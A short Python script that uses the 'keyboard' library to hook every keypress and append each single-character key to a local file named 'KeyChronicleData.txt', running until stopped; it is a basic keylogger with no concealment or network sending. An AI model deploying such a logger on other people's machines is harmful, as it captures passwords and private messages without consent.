import keyboard
import datetime
import time

output_file = 'KeyChronicleData.txt'

# Create a function to Write the key to the output file
def save_key(e):
    key = e.name
    if len(key) == 1:
        with open(output_file, 'a') as f:
            f.write(f"{key}")

keyboard.on_press(save_key)

# Start the keyboard listener
keyboard.wait()
